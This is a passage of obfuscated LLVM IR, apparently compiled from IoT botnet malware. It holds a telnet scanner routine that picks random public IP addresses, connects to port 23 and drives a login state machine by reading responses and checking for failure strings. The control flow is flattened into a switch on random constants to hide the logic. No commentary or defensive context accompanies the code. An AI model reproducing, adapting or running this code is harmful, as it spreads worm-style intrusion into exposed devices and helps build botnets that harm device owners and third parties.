  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %11, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = call i32 @rand_cmwc()
  %26 = xor i32 %24, %25
  call void @srand(i32 %26) #2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = call zeroext i16 @htons(i16 zeroext 23) #13
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %31 = getelementptr inbounds [8 x i8], [8 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %31, i8 0, i64 8, i32 4, i1 false)
  %32 = call noalias i8* @malloc(i64 1025) #2
  store i8* %32, i8** %17, align 8
  %33 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 1025, i32 1, i1 false)
  %34 = load i32, i32* %11, align 4
  %35 = zext i32 %34 to i64
  %36 = call i8* @llvm.stacksave()
  store i8* %36, i8** %19, align 8
  %37 = alloca %struct.telstate_t, i64 %35, align 16
  %38 = bitcast %struct.telstate_t* %37 to i8*
  %39 = load i32, i32* %11, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 5
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 %41, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 716750930, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar15 = load i32, i32* %switchVar
  switch i32 %switchVar15, label %switchDefault [
    i32 716750930, label %42
    i32 -322508399, label %47
    i32 -1842071582, label %61
    i32 -1639682214, label %64
    i32 -1620344197, label %65
    i32 -1324421112, label %73
    i32 1097275733, label %74
    i32 108160413, label %75
    i32 -528652673, label %76
    i32 247693374, label %77
    i32 743455794, label %82
    i32 -1552012354, label %90
    i32 220468368, label %96
    i32 -1092165826, label %NodeBlock13
    i32 483825502, label %NodeBlock11
    i32 1120078946, label %NodeBlock9
    i32 244297646, label %LeafBlock7
    i32 -2117605413, label %NodeBlock5
    i32 1608536152, label %NodeBlock3
    i32 -484113970, label %NodeBlock1
    i32 1563529430, label %NodeBlock
    i32 793414066, label %LeafBlock
    i32 -1827638320, label %112
    i32 973143379, label %121
    i32 -1584045713, label %141
    i32 848979888, label %150
    i32 -842049355, label %171
    i32 -363151756, label %176
    i32 -1006021885, label %185
    i32 1777367749, label %190
    i32 1084095734, label %191
    i32 399263369, label %192
    i32 -660958102, label %217
    i32 754253269, label %218
    i32 1301819016, label %241
    i32 802909168, label %246
    i32 1941301145, label %250
    i32 2087025165, label %254
    i32 -1893935637, label %255
    i32 596012230, label %256
    i32 -1988272891, label %265
    i32 1790038083, label %266
    i32 -309320907, label %300
    i32 -1256859554, label %311
    i32 1371625859, label %315
    i32 -1423152135, label %332
    i32 -742826956, label %333
    i32 1909759129, label %337
    i32 -329332741, label %341
    i32 165150669, label %342
    i32 1279764441, label %352
    i32 -1675446587, label %356
    i32 -1868559415, label %357
    i32 -406158661, label %372
    i32 -1616862900, label %381
    i32 -697512105, label %385
    i32 -1799112216, label %389
    i32 343668886, label %390
    i32 -1910158482, label %400
    i32 220230420, label %404
    i32 -961296288, label %405
    i32 816755183, label %431
    i32 1640411324, label %435
    i32 1547330235, label %444
    i32 -2112485761, label %448
    i32 645812170, label %452
    i32 962439541, label %467
    i32 1732920767, label %476
    i32 446264815, label %480
    i32 1168916991, label %484
    i32 -733906261, label %485
    i32 1535466053, label %495
    i32 889351740, label %499
    i32 -1267604796, label %500
    i32 1340436753, label %526
    i32 -464424977, label %530
    i32 -1291855343, label %539
    i32 -30639528, label %543
    i32 1461797367, label %547
    i32 -867849265, label %562
    i32 1105108939, label %576
    i32 1119657204, label %580
    i32 1313779483, label %589
    i32 309544645, label %598
    i32 -2103146226, label %602
    i32 1238018840, label %628
    i32 337003084, label %629
    i32 409922896, label %633
    i32 -1160115094, label %634
    i32 819037957, label %635
    i32 1941000021, label %645
    i32 1549061744, label %649
    i32 -169915153, label %650
    i32 -1914873166, label %664
    i32 -722925166, label %665
    i32 -1969197637, label %674
    i32 -641316849, label %675
    i32 -132054339, label %687
    i32 1304713727, label %713
    i32 867025086, label %723
    i32 -726578202, label %754
    i32 -1682554282, label %777
    i32 1960185210, label %781
    i32 -141602739, label %NewDefault
    i32 396854020, label %782
    i32 1297853314, label %783
    i32 1646589357, label %786
    i32 -592571239, label %787
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %5, align 4
  %44 = load i32, i32* %11, align 4
  %45 = icmp slt i32 %43, %44
  %46 = select i1 %45, i32 -322508399, i32 -1639682214
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %49
  %51 = bitcast %struct.telstate_t* %50 to i8*
  call void @llvm.memset.p0i8.i64(i8* %51, i8 0, i64 32, i32 16, i1 false)
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 3
  store i8 1, i8* %55, align 1
  %56 = load i8*, i8** %17, align 8
  %57 = load i32, i32* %5, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %58
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i32 0, i32 9
  store i8* %56, i8** %60, align 8
  store i32 -1842071582, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %5, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %5, align 4
  store i32 716750930, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -1620344197, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %7, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %7, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %68
  %70 = load i8*, i8** %69, align 8
  %71 = icmp ne i8* %70, null
  %72 = select i1 %71, i32 -1324421112, i32 1097275733
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 -1620344197, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  store i32 108160413, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  store i32 -528652673, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 247693374, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %5, align 4
  %79 = load i32, i32* %11, align 4
  %80 = icmp slt i32 %78, %79
  %81 = select i1 %80, i32 743455794, i32 1646589357
  store i32 %81, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %84
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %85, i32 0, i32 7
  %87 = load i32, i32* %86, align 16
  %88 = icmp eq i32 %87, 0
  %89 = select i1 %88, i32 -1552012354, i32 220468368
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %92 = load i32, i32* %5, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %93
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %94, i32 0, i32 7
  store i32 %91, i32* %95, align 16
  store i32 220468368, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %5, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %98
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %99, i32 0, i32 2
  %101 = load i8, i8* %100, align 8
  %102 = zext i8 %101 to i32
  store i32 %102, i32* %.reg2mem
  store i32 -1092165826, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload23 = load volatile i32, i32* %.reg2mem
  %Pivot14 = icmp slt i32 %.reload23, 4
  %103 = select i1 %Pivot14, i32 1608536152, i32 483825502
  store i32 %103, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload18 = load volatile i32, i32* %.reg2mem
  %Pivot12 = icmp slt i32 %.reload18, 6
  %104 = select i1 %Pivot12, i32 -2117605413, i32 1120078946
  store i32 %104, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload16 = load volatile i32, i32* %.reg2mem
  %Pivot10 = icmp slt i32 %.reload16, 7
  %105 = select i1 %Pivot10, i32 1461797367, i32 244297646
  store i32 %105, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf8 = icmp eq i32 %.reload, 7
  %106 = select i1 %SwitchLeaf8, i32 -169915153, i32 -141602739
  store i32 %106, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload17 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload17, 5
  %107 = select i1 %Pivot6, i32 645812170, i32 -1267604796
  store i32 %107, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload22 = load volatile i32, i32* %.reg2mem
  %Pivot4 = icmp slt i32 %.reload22, 2
  %108 = select i1 %Pivot4, i32 1563529430, i32 -484113970
  store i32 %108, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload19 = load volatile i32, i32* %.reg2mem
  %Pivot2 = icmp slt i32 %.reload19, 3
  %109 = select i1 %Pivot2, i32 -1868559415, i32 -961296288
  store i32 %109, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload21 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload21, 1
  %110 = select i1 %Pivot, i32 793414066, i32 -1893935637
  store i32 %110, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload20 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload20, 0
  %111 = select i1 %SwitchLeaf, i32 -1827638320, i32 -141602739
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %114
  %116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %115, i32 0, i32 3
  %117 = load i8, i8* %116, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 1
  %120 = select i1 %119, i32 973143379, i32 -1584045713
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %5, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %123
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %124, i32 0, i32 9
  %126 = load i8*, i8** %125, align 8
  store i8* %126, i8** %20, align 8
  %127 = load i32, i32* %5, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %128
  %130 = bitcast %struct.telstate_t* %129 to i8*
  call void @llvm.memset.p0i8.i64(i8* %130, i8 0, i64 32, i32 16, i1 false)
  %131 = load i8*, i8** %20, align 8
  %132 = load i32, i32* %5, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %133
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %134, i32 0, i32 9
  store i8* %131, i8** %135, align 8
  %136 = call i32 @GetRandomPublicIP()
  %137 = load i32, i32* %5, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %138
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %139, i32 0, i32 1
  store i32 %136, i32* %140, align 4
  store i32 399263369, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i32, i32* %5, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 3
  %146 = load i8, i8* %145, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 0
  %149 = select i1 %148, i32 848979888, i32 1084095734
  store i32 %149, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32, i32* %5, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %152
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %153, i32 0, i32 5
  %155 = load i8, i8* %154, align 1
  %156 = add i8 %155, 1
  store i8 %156, i8* %154, align 1
  %157 = load i32, i32* %5, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %158
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %159, i32 0, i32 4
  %161 = load i8, i8* %160, align 2
  %162 = add i8 %161, 1
  store i8 %162, i8* %160, align 2
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %164
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %165, i32 0, i32 5
  %167 = load i8, i8* %166, align 1
  %168 = zext i8 %167 to i64
  %169 = icmp eq i64 %168, 20
  %170 = select i1 %169, i32 -842049355, i32 -363151756
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %172 = load i32, i32* %5, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 3
  store i8 1, i8* %175, align 1
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i32, i32* %5, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %178
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %179, i32 0, i32 4
  %181 = load i8, i8* %180, align 2
  %182 = zext i8 %181 to i64
  %183 = icmp eq i64 %182, 20
  %184 = select i1 %183, i32 -1006021885, i32 1777367749
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i32, i32* %5, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 3
  store i8 1, i8* %189, align 1
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  store i32 1084095734, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  store i32 399263369, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %193, align 4
  %194 = call zeroext i16 @htons(i16 zeroext 23) #13
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %194, i16* %195, align 2
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %197 = getelementptr inbounds [8 x i8], [8 x i8]* %196, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %197, i8 0, i64 8, i32 4, i1 false)
  %198 = load i32, i32* %5, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %204 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %203, i32 0, i32 0
  store i32 %202, i32* %204, align 4
  %205 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %206 = load i32, i32* %5, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %207
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %208, i32 0, i32 0
  store i32 %205, i32* %209, align 16
  %210 = load i32, i32* %5, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %211
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %212, i32 0, i32 0
  %214 = load i32, i32* %213, align 16
  %215 = icmp eq i32 %214, -1
  %216 = select i1 %215, i32 -660958102, i32 754253269
  store i32 %216, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %5, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 16
  %224 = load i32, i32* %5, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 16
  %229 = call i32 (i32, i32, ...) @fcntl(i32 %228, i32 3, i8* null)
  %230 = or i32 %229, 2048
  %231 = call i32 (i32, i32, ...) @fcntl(i32 %223, i32 4, i32 %230)
  %232 = load i32, i32* %5, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %233
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %234, i32 0, i32 0
  %236 = load i32, i32* %235, align 16
  %237 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %238 = call i32 @connect(i32 %236, %struct.sockaddr* %237, i32 16)
  %239 = icmp eq i32 %238, -1
  %240 = select i1 %239, i32 1301819016, i32 1941301145
  store i32 %240, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i32* @__errno_location() #13
  %243 = load i32, i32* %242, align 4
  %244 = icmp ne i32 %243, 115
  %245 = select i1 %244, i32 802909168, i32 1941301145
  store i32 %245, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load i32, i32* %5, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %248
  call void @reset_telstate(%struct.telstate_t* %249)
  store i32 2087025165, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i32, i32* %5, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %252
  call void @advance_state(%struct.telstate_t* %253, i32 1)
  store i32 2087025165, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  store i32 396854020, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  store i32 596012230, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %258 = getelementptr inbounds [16 x i64], [16 x i64]* %257, i64 0, i64 0
  %259 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %258) #2, !srcloc !6
  %260 = extractvalue { i64, i64* } %259, 0
  %261 = extractvalue { i64, i64* } %259, 1
  %262 = trunc i64 %260 to i32
  store i32 %262, i32* %21, align 4
  %263 = ptrtoint i64* %261 to i64
  %264 = trunc i64 %263 to i32
  store i32 %264, i32* %22, align 4
  store i32 -1988272891, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  store i32 1790038083, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  %267 = load i32, i32* %5, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %268
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %269, i32 0, i32 0
  %271 = load i32, i32* %270, align 16
  %272 = srem i32 %271, 64
  %273 = zext i32 %272 to i64
  %274 = shl i64 1, %273
  %275 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %276 = load i32, i32* %5, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %277
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %278, i32 0, i32 0
  %280 = load i32, i32* %279, align 16
  %281 = sdiv i32 %280, 64
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds [16 x i64], [16 x i64]* %275, i64 0, i64 %282
  %284 = load i64, i64* %283, align 8
  %285 = or i64 %284, %274
  store i64 %285, i64* %283, align 8
  %286 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %286, align 8
  %287 = load i32, i32* %3, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %288, i64* %289, align 8
  %290 = load i32, i32* %5, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %291
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %292, i32 0, i32 0
  %294 = load i32, i32* %293, align 16
  %295 = add nsw i32 %294, 1
  %296 = call i32 @select(i32 %295, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %296, i32* %6, align 4
  %297 = load i32, i32* %6, align 4
  %298 = icmp eq i32 %297, 1
  %299 = select i1 %298, i32 -309320907, i32 -742826956
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %301 = load i32, i32* %5, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %302
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 16
  %306 = bitcast i32* %15 to i8*
  %307 = call i32 @getsockopt(i32 %305, i32 1, i32 4, i8* %306, i32* %14) #2
  %308 = load i32, i32* %15, align 4
  %309 = icmp ne i32 %308, 0
  %310 = select i1 %309, i32 -1256859554, i32 1371625859
  store i32 %310, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i32, i32* %5, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %313
  call void @reset_telstate(%struct.telstate_t* %314)
  store i32 -1423152135, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  %316 = load i32, i32* %5, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %317
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %318, i32 0, i32 0
  %320 = load i32, i32* %319, align 16
  %321 = load i32, i32* %5, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %322
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %323, i32 0, i32 0
  %325 = load i32, i32* %324, align 16
  %326 = call i32 (i32, i32, ...) @fcntl(i32 %325, i32 3, i8* null)
  %327 = and i32 %326, -2049
  %328 = call i32 (i32, i32, ...) @fcntl(i32 %320, i32 4, i32 %327)
  %329 = load i32, i32* %5, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %330
  call void @advance_state(%struct.telstate_t* %331, i32 2)
  store i32 -1423152135, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i32, i32* %6, align 4
  %335 = icmp eq i32 %334, -1
  %336 = select i1 %335, i32 1909759129, i32 -329332741
  store i32 %336, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  %338 = load i32, i32* %5, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %339
  call void @reset_telstate(%struct.telstate_t* %340)
  store i32 1297853314, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  store i32 165150669, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load i32, i32* %5, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %344
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %345, i32 0, i32 7
  %347 = load i32, i32* %346, align 16
  %348 = add i32 %347, 5
  %349 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %350 = icmp ult i32 %348, %349
  %351 = select i1 %350, i32 1279764441, i32 -1675446587
  store i32 %351, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i32, i32* %5, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %354
  call void @reset_telstate(%struct.telstate_t* %355)
  store i32 -1675446587, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  store i32 396854020, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i32, i32* %5, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %359
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %360, i32 0, i32 0
  %362 = load i32, i32* %361, align 16
  %363 = load i32, i32* %3, align 4
  %364 = load i32, i32* %5, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %365
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %366, i32 0, i32 9
  %368 = load i8*, i8** %367, align 8
  %369 = call i32 @read_until_response(i32 %362, i32 %363, i8* %368, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %370 = icmp ne i32 %369, 0
  %371 = select i1 %370, i32 -406158661, i32 343668886
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = load i32, i32* %5, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %374
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %375, i32 0, i32 9
  %377 = load i8*, i8** %376, align 8
  %378 = call i32 @contains_fail(i8* %377)
  %379 = icmp ne i32 %378, 0
  %380 = select i1 %379, i32 -1616862900, i32 -697512105
  store i32 %380, i32* %switchVar
  br label %loopEnd

; <label>:381:                                    ; preds = %loopEntry
  %382 = load i32, i32* %5, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %383
  call void @advance_state(%struct.telstate_t* %384, i32 0)
  store i32 -1799112216, i32* %switchVar
  br label %loopEnd

